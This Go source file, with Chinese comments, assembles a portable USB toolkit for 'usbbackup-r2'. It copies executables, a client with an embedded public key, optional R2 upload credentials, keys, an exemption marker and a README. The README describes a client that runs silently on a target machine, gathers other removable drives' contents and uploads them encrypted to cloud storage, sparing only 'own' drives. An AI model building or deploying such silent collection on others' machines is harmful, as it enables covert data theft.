package main

import (
	"flag"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/immml/UsbBackUP-R2/internal/cli"
	"github.com/immml/UsbBackUP-R2/internal/clientgen"
	"github.com/immml/UsbBackUP-R2/internal/keystore"
	"github.com/immml/UsbBackUP-R2/internal/version"
	"github.com/immml/UsbBackUP-R2/internal/winvol"
)

// toolFiles 是要装进工具 U 盘的可执行文件（相对本程序所在目录）。
var toolFiles = []string{
	"usbsetup-r2.exe", "usbkeygen-r2.exe", "usbunseal-r2.exe", "usbbackup-r2.exe", "usbcomp-r2.exe",
}

// toolkitOptions 是组装工具盘的输入。
type toolkitOptions struct {
	// Dest 是目标根目录（U 盘根目录）。
	Dest string
	// SubDir 是工具在盘内的相对子目录（如 `backup\tools`）；空表示直接放盘根。
	//
	// 注意：`.usbbackup-allow` 不受它影响，永远写在 Dest 下——
	// 授权标记只在卷根被检查（collectpolicy 只 Stat `<root>\.usbbackup-allow`），
	// 一旦挪进子目录，这个盘就会被当成普通介质采集走。
	SubDir string
	// ToolDir 是工具 exe 的来源目录（一般是本程序所在目录）。
	ToolDir string
	// PublicKeyPath / PrivateKeyPath 是密钥来源。
	PublicKeyPath  string
	PrivateKeyPath string
	// WithPrivate 决定是否把私钥写进 U 盘。
	WithPrivate bool
	// WithClient 决定是否生成/复制 client.exe。
	WithClient bool
	// CredentialPath 是可选的 R2 凭据文件，给了就一并放进盘里并让客户端带上上传能力。
	CredentialPath string
	// Force 允许覆盖已存在的同名文件。
	Force bool
}

// cmdInstallUSB 把一个「便携工具 U 盘」组装到指定盘符。
//
// 盘内布局：
//
//	<U盘>\
//	├── usbsetup-r2.exe / usbkeygen-r2.exe / usbunseal-r2.exe / usbbackup-r2.exe / usbcomp-r2.exe
//	├── client.exe            生成器产出的客户端（内嵌配置与公钥）
//	├── client.json           可选：R2 凭据（DPAPI 保护，与 client.exe 同目录）
//	├── keys\usbbackup-r2.pub.pem
//	├── keys\usbbackup-r2.key.pem（默认带；--without-private 可排除）
//	├── .usbbackup-allow     授权标记，内容是公钥指纹
//	└── README.txt            用法与私钥风险说明
//
// `.usbbackup-allow` 的语义是**豁免**：客户端读到它就知道"这是自己人的盘，
// 里面甚至有私钥"，于是拒绝采集——工具盘不会被自己人打包上传。
// 这个文件名与不含出站能力的版本完全一致，两个项目的盘互相认。
func cmdInstallUSB(args []string, stdout, stderr io.Writer) int {
	fs := flag.NewFlagSet("install-usb", flag.ContinueOnError)
	fs.SetOutput(stderr)
	drive := fs.String("drive", "", "目标 U 盘盘符，如 E:（必填）")
	subDir := fs.String("subdir", "", "工具在盘内的子目录，如 backup\\tools（默认放盘根）")
	pub := fs.String("public", "", "公钥路径（默认与本程序同目录的 keys/usbbackup-r2.pub.pem）")
	priv := fs.String("private", "", "私钥路径（默认与本程序同目录的 keys/usbbackup-r2.key.pem）")
	keyDir := fs.String("keys", "", "密钥目录（同时给出公钥与私钥时可只写这一项）")
	credPath := fs.String("cred", "", "一并放进盘内的 R2 凭据 client.json（可选，给了则客户端带上传能力）")
	withoutPriv := fs.Bool("without-private", false, "不把私钥写进 U 盘")
	noClient := fs.Bool("no-client", false, "不生成/复制 client.exe")
	force := fs.Bool("force", false, "目标已有同名文件时覆盖")
	if err := cli.ParseArgs(fs, args); err != nil {
		return cli.ExitUsage
	}
	if strings.TrimSpace(*drive) == "" {
		fmt.Fprintln(stderr, "用法：usbkeygen-r2 install-usb --drive E: [--keys DIR] [--without-private] [--no-client] [--force]")
		return cli.ExitUsage
	}
	// 先规范化再校验：非法值（绝对路径 / 含 ..）直接按"不指定"处理会让人以为生效了，
	// 所以这里明确报错，而不是静默退化。
	sub := cleanSubDir(*subDir)
	if strings.TrimSpace(*subDir) != "" && sub == "" {
		fmt.Fprintf(stderr, "错误：--subdir %q 不是合法的相对子目录（不接受绝对路径、盘符或 ..）。\n", *subDir)
		return cli.ExitUsage
	}

	root, err := winvol.NormalizeRoot(*drive)
	if err != nil {
		fmt.Fprintf(stderr, "错误：%v\n", err)
		return cli.ExitUsage
	}
	vol, err := winvol.Query(root)
	if err != nil {
		// 区分"盘符不存在/没插介质"与"插了但不是 U 盘"：
		// 两者的处理办法完全不同，报成同一句会让人白找半天。
		if vol.DriveType == winvol.DriveNoRootDir || vol.DriveType == winvol.DriveUnknown {
			fmt.Fprintf(stderr, "错误：%s 不存在或没有插入介质。\n", root)
			return cli.ExitRuntime
		}
		fmt.Fprintf(stderr, "错误：无法访问 %s：%v\n", root, err)
		return cli.ExitRuntime
	}
	if !vol.Ready {
		fmt.Fprintf(stderr, "错误：%s 未就绪（介质未插入？）\n", root)
		return cli.ExitRuntime
	}
	if !vol.Removable {
		fmt.Fprintf(stderr, "错误：%s 不是可移动磁盘（类型 %s），拒绝写入。\n", root, winvol.DriveTypeName(vol.DriveType))
		fmt.Fprintln(stderr, "      这个命令只往 U 盘装东西；若是固定盘请确认盘符。")
		return cli.ExitUsage
	}

	exeDir := exeDirOf()
	pubPath := firstNonEmpty(*pub, filepath.Join(*keyDir, "usbbackup-r2.pub.pem"), filepath.Join(exeDir, "keys", "usbbackup-r2.pub.pem"))
	privPath := firstNonEmpty(*priv, filepath.Join(*keyDir, "usbbackup-r2.key.pem"), filepath.Join(exeDir, "keys", "usbbackup-r2.key.pem"))

	pubRaw, err := os.ReadFile(pubPath)
	if err != nil {
		fmt.Fprintf(stderr, "错误：读取公钥失败：%v\n", err)
		fmt.Fprintln(stderr, "      请用 --public 指定，或先执行 usbkeygen-r2 generate。")
		return cli.ExitRuntime
	}
	pubKey, err := keystore.ParsePublicKeyPEM(pubRaw)
	if err != nil {
		fmt.Fprintf(stderr, "错误：%v\n", err)
		return cli.ExitRuntime
	}
	_, fpText, err := keystore.PublicKeyFingerprint(pubKey)
	if err != nil {
		fmt.Fprintf(stderr, "错误：计算公钥指纹失败：%v\n", err)
		return cli.ExitRuntime
	}

	withPriv := !*withoutPriv
	if withPriv {
		if _, err := os.Stat(privPath); err != nil {
			fmt.Fprintf(stderr, "提示：未找到私钥 %s，本次不写入私钥。\n", privPath)
			withPriv = false
		}
	}

	fmt.Fprintf(stdout, "目标 U 盘  : %s（%s，剩余 %s）\n", root, emptyOr(vol.Label, "无卷标"), humanBytes(vol.FreeBytes))
	if sub != "" {
		fmt.Fprintf(stdout, "工具目录  : %s（授权标记仍写盘根）\n", filepath.Join(root, sub))
	}
	fmt.Fprintf(stdout, "公钥指纹  : %s\n", fpText)
	fmt.Fprintf(stdout, "写入私钥  : %v\n\n", withPriv)

	n, err := assembleToolkit(toolkitOptions{
		Dest:           root,
		SubDir:         sub,
		ToolDir:        exeDir,
		PublicKeyPath:  pubPath,
		PrivateKeyPath: privPath,
		WithPrivate:    withPriv,
		WithClient:     !*noClient,
		CredentialPath: strings.TrimSpace(*credPath),
		Force:          *force,
	}, stdout)
	if err != nil {
		fmt.Fprintf(stderr, "错误：%v\n", err)
		return cli.ExitRuntime
	}

	fmt.Fprintf(stdout, "\n完成：共写入 %d 项到 %s\n", n, root)
	if withPriv {
		fmt.Fprintln(stdout)
		if privateIsEncrypted(toolkitOptions{WithPrivate: true, PrivateKeyPath: privPath}) {
			fmt.Fprintln(stdout, "  [!] 盘上有**带口令的私钥**。盘与口令同时丢失 = 所有备份可被解开，")
			fmt.Fprintln(stdout, "      且口令不要写在这个盘上。请随身保管，或改用 --without-private 只带公钥。")
		} else {
			fmt.Fprintln(stdout, "  [!] 盘上有**明文私钥**。U 盘一旦丢失或被复制，")
			fmt.Fprintln(stdout, "      所有用它加密的备份都能被解开。请随身保管，")
			fmt.Fprintln(stdout, "      或改用 --without-private 只带公钥。")
		}
	}
	fmt.Fprintln(stdout)
	fmt.Fprintln(stdout, "  这个盘不会再被客户端采集走：盘根有 .usbbackup-allow（授权标记），")
	fmt.Fprintln(stdout, "  客户端读到它就豁免，不会读取、打包或上传盘上任何内容。")
	fmt.Fprintln(stdout)
	fmt.Fprintf(stdout, "  用法：把本盘插到目标机器，运行 %s（先 accept 一次，之后静默）；\n",
		pathOnDisk(root, sub, "client.exe"))
	if strings.TrimSpace(*credPath) != "" {
		fmt.Fprintln(stdout, "        客户端会按盘内 client.json 把加密产物自动上传到 R2；")
		fmt.Fprintln(stdout, "        注意 DPAPI 凭据与**目标机器**绑定，本盘上的这份要重新生成才有效。")
	}
	fmt.Fprintf(stdout, "        取回 .usbk 后，用 usbunseal-r2.exe 解密还原：\n")
	fmt.Fprintln(stdout, "          usbunseal-r2.exe pull --out <目录> --key keys\\usbbackup-r2.key.pem")
	return cli.ExitOK
}

// assembleToolkit 把工具、客户端、密钥、授权标记与说明写入目标根目录。
//
// 与盘符校验分离，这样即使机器上没有可移动介质，
// 这段组装逻辑也能在临时目录里被单元测试覆盖。
func assembleToolkit(opt toolkitOptions, out io.Writer) (int, error) {
	written := 0

	base, err := toolkitBaseDir(opt)
	if err != nil {
		return written, err
	}

	// 1) 工具本体：缺失的跳过（允许只带部分工具）。
	for _, name := range toolFiles {
		src := filepath.Join(opt.ToolDir, name)
		if _, err := os.Stat(src); err != nil {
			continue
		}
		if err := copyFile(src, filepath.Join(base, name), opt.Force); err != nil {
			return written, fmt.Errorf("复制 %s 失败: %w", name, err)
		}
		written++
		fmt.Fprintf(out, "  [OK] %s\n", relOnDisk(opt, name))
	}

	// 2) 客户端：优先复用同目录已有的，否则现场生成一个。
	if opt.WithClient {
		dst := filepath.Join(base, "client.exe")
		clientSrc := filepath.Join(opt.ToolDir, "client.exe")
		if _, err := os.Stat(clientSrc); err == nil {
			if err := copyFile(clientSrc, dst, opt.Force); err != nil {
				return written, fmt.Errorf("复制 client.exe 失败: %w", err)
			}
			fmt.Fprintf(out, "  [OK] %s（复用已有）\n", relOnDisk(opt, "client.exe"))
		} else {
			pubRaw, err := os.ReadFile(opt.PublicKeyPath)
			if err != nil {
				return written, fmt.Errorf("读取公钥失败: %w", err)
			}
			// 凭据给了就顺手把上传打开；没给就保持"只落本地"。
			// 内嵌的凭据名用相对名，客户端按"与自身同目录"解析。
			build := clientgen.Options{
				PublicKeyPEM: pubRaw,
				Template:     filepath.Join(opt.ToolDir, "usbbackup-r2.exe"),
				Output:       dst,
				ClientName:   "usb-toolkit",
				Force:        opt.Force,
			}
			if opt.CredentialPath != "" {
				build.EnableUpload = true
				build.CredentialFile = DefaultCredentialFileName
			}
			res, err := clientgen.Build(build)
			if err != nil {
				return written, fmt.Errorf("生成 client.exe 失败: %w", err)
			}
			fmt.Fprintf(out, "  [OK] %s（现场生成，%d 位公钥，上传 %v）\n",
				relOnDisk(opt, "client.exe"), res.KeyBits, res.UploadEnabled)
		}
		written++
	}

	// 2b) R2 凭据（可选）。
	//
	// 必须提醒的是：凭据是 DPAPI **机器范围**加密的，在这一台电脑上生成的
	// 拿到目标机器上解不开。所以放进盘里主要是为了"随盘带着走、当场换机重新生成"，
	// 而不是拿起来就能用。
	if opt.CredentialPath != "" {
		if _, err := os.Stat(opt.CredentialPath); err != nil {
			return written, fmt.Errorf("读取 R2 凭据失败: %w", err)
		}
		if err := copyFile(opt.CredentialPath, filepath.Join(base, DefaultCredentialFileName), opt.Force); err != nil {
			return written, fmt.Errorf("写入 %s 失败: %w", DefaultCredentialFileName, err)
		}
		fmt.Fprintf(out, "  [OK] %s（DPAPI 凭据，仅对生成它的那台机器有效）\n",
			relOnDisk(opt, DefaultCredentialFileName))
		written++
	}

	// 3) 密钥目录。
	keyDst := filepath.Join(base, "keys")
	if err := os.MkdirAll(keyDst, 0o755); err != nil {
		return written, fmt.Errorf("创建 keys 目录失败: %w", err)
	}
	if err := copyFile(opt.PublicKeyPath, filepath.Join(keyDst, "usbbackup-r2.pub.pem"), opt.Force); err != nil {
		return written, fmt.Errorf("写入公钥失败: %w", err)
	}
	fmt.Fprintf(out, "  [OK] %s\n", relOnDisk(opt, filepath.Join("keys", "usbbackup-r2.pub.pem")))
	written++
	if opt.WithPrivate {
		if err := copyFile(opt.PrivateKeyPath, filepath.Join(keyDst, "usbbackup-r2.key.pem"), opt.Force); err != nil {
			return written, fmt.Errorf("写入私钥失败: %w", err)
		}
		kind := "明文"
		if raw, err := os.ReadFile(opt.PrivateKeyPath); err == nil && keystore.IsEncryptedPrivateKeyPEM(raw) {
			kind = "口令保护"
		}
		fmt.Fprintf(out, "  [OK] %s（%s）\n",
			relOnDisk(opt, filepath.Join("keys", "usbbackup-r2.key.pem")), kind)
		written++
	}

	// 4) 授权标记：让客户端**拒绝采集**这个盘。
	//
	// 名字与不含出站能力的版本（项目 A）保持一致：两边的工具盘互相认。
	// 内容写公钥指纹，便于人肉核对"这块盘是谁的"，但判定只看**存在性**——
	// 能往盘根写文件的人本来就能伪造内容，靠内容做权限判定是假的。
	pubRaw, err := os.ReadFile(opt.PublicKeyPath)
	if err != nil {
		return written, err
	}
	pubKey, err := keystore.ParsePublicKeyPEM(pubRaw)
	if err != nil {
		return written, err
	}
	_, fpText, err := keystore.PublicKeyFingerprint(pubKey)
	if err != nil {
		return written, err
	}
	marker := fmt.Sprintf("# usbbackup-r2 授权标记：本盘被豁免，客户端不会采集/上传它的内容\n"+
		"# 生成时间 %s（生成器 %s）\nfingerprint=%s\n",
		time.Now().Format(time.RFC3339), version.Version, fpText)
	if err := writeFile(filepath.Join(opt.Dest, ".usbbackup-allow"), []byte(marker), opt.Force); err != nil {
		return written, fmt.Errorf("写入授权标记失败: %w", err)
	}
	fmt.Fprintln(out, "  [OK] .usbbackup-allow（授权标记 → 本盘被豁免）")
	written++

	// 5) 说明文件（每次都重写，保证与盘内实际内容一致）。
	//    README 必须如实反映私钥是否带口令，否则现场的人会按错误的风险等级处理。
	//    它落在工具目录里，所以文中的相对路径（keys\…）在有无子目录时都成立。
	readme := toolkitReadme(fpText, opt.WithPrivate, privateIsEncrypted(opt), opt.CredentialPath != "")
	if err := writeFile(filepath.Join(base, "README.txt"), []byte(readme), true); err != nil {
		return written, fmt.Errorf("写入 README.txt 失败: %w", err)
	}
	fmt.Fprintf(out, "  [OK] %s\n", relOnDisk(opt, "README.txt"))
	written++

	return written, nil
}

// toolkitBaseDir 返回工具实际落盘的目录（= Dest/SubDir）。
func toolkitBaseDir(opt toolkitOptions) (string, error) {
	sub := cleanSubDir(opt.SubDir)
	if sub == "" {
		return opt.Dest, nil
	}
	base := filepath.Join(opt.Dest, sub)
	if err := os.MkdirAll(base, 0o755); err != nil {
		return "", fmt.Errorf("创建工具目录 %s 失败: %w", base, err)
	}
	return base, nil
}

// cleanSubDir 规范化并校验 --subdir 的值。
//
// 只接受相对子路径：绝对路径、盘符、以及任何含 `..` 的写法一律拒绝——
// 这个参数来自命令行，放任它逃出盘外就会变成"往任意目录写文件"。
func cleanSubDir(sub string) string {
	sub = strings.TrimSpace(sub)
	if sub == "" {
		return ""
	}
	sub = strings.ReplaceAll(sub, "/", string(filepath.Separator))
	sub = filepath.Clean(sub)
	if sub == "." || sub == string(filepath.Separator) {
		return ""
	}
	// `\foo` / `/foo` 在 Windows 上既不是 IsAbs 也没有盘符，
	// 但拼到 `E:` 后面会变成 `E:\foo`——看起来合法，实则指向盘根而非子目录，
	// 与使用者意图不符，直接拒掉。
	if strings.HasPrefix(sub, string(filepath.Separator)) || strings.HasPrefix(sub, "/") {
		return ""
	}
	if filepath.IsAbs(sub) || filepath.VolumeName(sub) != "" {
		return ""
	}
	if sub == ".." || strings.HasPrefix(sub, ".."+string(filepath.Separator)) ||
		strings.Contains(sub, string(filepath.Separator)+"..") {
		return ""
	}
	return sub
}

// relOnDisk 把盘内相对路径显示成"从盘根算起"的形式，方便核对落点。
func relOnDisk(opt toolkitOptions, name string) string {
	if sub := cleanSubDir(opt.SubDir); sub != "" {
		return filepath.Join(sub, name)
	}
	return name
}

// pathOnDisk 拼出盘内文件的完整路径，用于收尾提示。
func pathOnDisk(root, sub, name string) string {
	if sub != "" {
		return filepath.Join(root, sub, name)
	}
	return filepath.Join(root, name)
}

// privateIsEncrypted 判断本次上盘的私钥是否带口令保护。
// 读取失败时按"明文"处理——宁可把风险说重，也不说轻。
func privateIsEncrypted(opt toolkitOptions) bool {
	if !opt.WithPrivate {
		return false
	}
	raw, err := os.ReadFile(opt.PrivateKeyPath)
	if err != nil {
		return false
	}
	return keystore.IsEncryptedPrivateKeyPEM(raw)
}

// toolkitReadme 生成盘内说明文件。
func toolkitReadme(fingerprint string, hasPriv, privEncrypted bool, hasCred bool) string {
	var b strings.Builder
	b.WriteString("usbbackup-r2 便携工具盘\n")
	b.WriteString("====================\n\n")
	b.WriteString("盘里有什么\n")
	b.WriteString("  usbsetup-r2.exe      交互式生成向导（推荐，双击即问即答）\n")
	b.WriteString("  usbkeygen-r2.exe     生成器（密钥 / R2 凭据 / 客户端 / 工具盘）\n")
	b.WriteString("  usbunseal-r2.exe     解压器（用私钥解密还原，支持从 R2 直接拉取）\n")
	b.WriteString("  usbbackup-r2.exe     主程序 / 客户端模板\n")
	b.WriteString("  usbcomp-r2.exe       独立压缩器（手工打包某个目录）\n")
	b.WriteString("  client.exe           已内嵌配置与公钥的客户端\n")
	if hasCred {
		b.WriteString("  client.json          R2 凭据（DPAPI 机器范围加密，见下方说明）\n")
	}
	b.WriteString("  keys/                密钥材料（见下方风险）\n")
	b.WriteString("  .usbbackup-allow     授权标记（公钥指纹）→ 本盘被豁免，不会被采集\n\n")
	b.WriteString("怎么用（目标机器上）\n")
	b.WriteString("  1) 插上本盘，运行 client.exe accept   ← 首次确认一次\n")
	b.WriteString("  2) 运行 client.exe run                ← 之后静默常驻\n")
	b.WriteString("  3) 密文产物 .usbk 会自动上传到 R2；也可以手工补传：\n")
	b.WriteString("     usbbackup-r2.exe upload <文件>.usbk\n")
	b.WriteString("  4) 在放有私钥的机器上取回并解密：\n")
	b.WriteString("     usbunseal-r2.exe pull --out <目录> --key keys/usbbackup-r2.key.pem --cred client.json\n")
	b.WriteString("     （--cred 省略时会依次找 .\\client.json 与 %LOCALAPPDATA%\\usbbackup-r2\\client.json）\n")
	b.WriteString("     私钥带口令时追加 --pass（交互式）或 --pass-file <口令文件>\n\n")
	b.WriteString("为什么这个盘不会被采集走\n")
	b.WriteString("  盘根目录有 .usbbackup-allow（内容是指纹）。客户端读到它就知道\n")
	b.WriteString("  「这是自己人的盘，里面甚至有私钥」，于是**豁免**：不读取、不打包、不上传。\n")
	b.WriteString("  这条判定不受采集策略影响——哪怕策略是 all 也一样豁免。\n\n")
	b.WriteString("公钥指纹\n")
	fmt.Fprintf(&b, "  %s\n\n", fingerprint)
	if hasCred {
		b.WriteString("关于 client.json（R2 凭据）\n")
		b.WriteString("  它用 Windows DPAPI 的**机器范围**密钥加密，因此：\n")
		b.WriteString("  - 在这一台电脑上生成的，拿到别的机器上解不开（这是设计意图，不是故障）；\n")
		b.WriteString("  - 换机器/重装系统后，在目标机器上重新执行 usbkeygen-r2 cred 生成一份；\n")
		b.WriteString("  - 泄漏时到 R2 控制台吊销 token 并换一份凭据即可，**不需要**重新编译客户端；\n")
		b.WriteString("  - token 请用「Object Read & Write + 仅限目标桶」，不要用 Admin 两档；\n")
		b.WriteString("    R2 没有「只写不读」这一档，也不能把长效 token 限定到 key 前缀，\n")
		b.WriteString("    所以这一档同时能读/覆盖/删除 —— 请给桶开**版本控制**，并定期轮换 token。\n\n")
	}
	if hasPriv && privEncrypted {
		b.WriteString("[!] 私钥风险（口令保护）\n")
		b.WriteString("  本目录下的 keys\\usbbackup-r2.key.pem 带口令保护：不知道口令则无法解开。\n")
		b.WriteString("  但口令保护不等于安全——盘和口令同时丢失就等于明文丢失：\n")
		b.WriteString("  - 不要把口令写在这个盘上的任何文件里（包括本文件）；\n")
		b.WriteString("  - 不要把这个盘插到不受你控制的机器上；\n")
		b.WriteString("  - 解密时会提示输入口令（usbunseal-r2 --pass）。\n")
	} else if hasPriv {
		b.WriteString("[!] 私钥风险（明文，高风险）\n")
		b.WriteString("  本目录下的 keys\\usbbackup-r2.key.pem 是**明文私钥**，拿到盘就能解密：\n")
		b.WriteString("  - 盘丢了 = 所有用对应公钥加密的备份都能被解开；\n")
		b.WriteString("  - 不要把这个盘插到不受你控制的机器上；\n")
		b.WriteString("  - 更稳妥的做法：换成带口令的私钥，或只带公钥（--without-private 重装）。\n")
	} else {
		b.WriteString("本盘只带公钥，私钥未上盘：解密时需要从你的电脑取私钥。\n")
	}
	fmt.Fprintf(&b, "\n生成于 usbbackup-r2 %s\n", version.Version)
	return b.String()
}

// ---- 小工具 ----

func exeDirOf() string {
	exe, err := os.Executable()
	if err != nil {
		return "."
	}
	return filepath.Dir(exe)
}

func firstNonEmpty(vals ...string) string {
	for _, v := range vals {
		if strings.TrimSpace(v) != "" {
			return v
		}
	}
	return ""
}

func emptyOr(s, fallback string) string {
	if strings.TrimSpace(s) == "" {
		return fallback
	}
	return s
}

func copyFile(src, dst string, force bool) error {
	if !force {
		if _, err := os.Stat(dst); err == nil {
			return fmt.Errorf("%s 已存在（加 --force 覆盖）", dst)
		}
	}
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()
	out, err := os.OpenFile(dst, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0o755)
	if err != nil {
		return err
	}
	if _, err := io.Copy(out, in); err != nil {
		out.Close()
		return err
	}
	return out.Close()
}

func writeFile(path string, body []byte, force bool) error {
	if !force {
		if _, err := os.Stat(path); err == nil {
			return fmt.Errorf("%s 已存在（加 --force 覆盖）", path)
		}
	}
	return os.WriteFile(path, body, 0o644)
}

func humanBytes(n int64) string {
	const unit = 1024
	if n < unit {
		return fmt.Sprintf("%d B", n)
	}
	div, exp := int64(unit), 0
	for v := n / unit; v >= unit; v /= unit {
		div *= unit
		exp++
	}
	return fmt.Sprintf("%.1f %ciB", float64(n)/float64(div), "KMGTPE"[exp])
}
